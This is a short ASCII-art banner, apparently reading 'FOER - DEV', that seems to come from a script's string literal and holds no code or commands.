	________ ________  _______   ________                             ________  _______   ___      ___ 
	|\  _____\\   __  \|\  ___ \ |\   __  \                           |\   ___ \|\  ___ \ |\  \    /  /|
	\ \  \__/\ \  \|\  \ \   __/|\ \  \|\  \        ____________      \ \  \_|\ \ \   __/|\ \  \  /  / /
	 \ \   __\\ \  \\\  \ \  \_|/_\ \   _  _\      |\____________\     \ \  \ \\ \ \  \_|/_\ \  \/  / / 
	  \ \  \_| \ \  \\\  \ \  \_|\ \ \  \\  \|     \|____________|      \ \  \_\\ \ \  \_|\ \ \    / /  
	   \ \__\   \ \_______\ \_______\ \__\\ _\                           \ \_______\ \_______\ \__/ /   
	    \|__|    \|_______|\|_______|\|__|\|__|                           \|_______|\|_______|\|__|/]])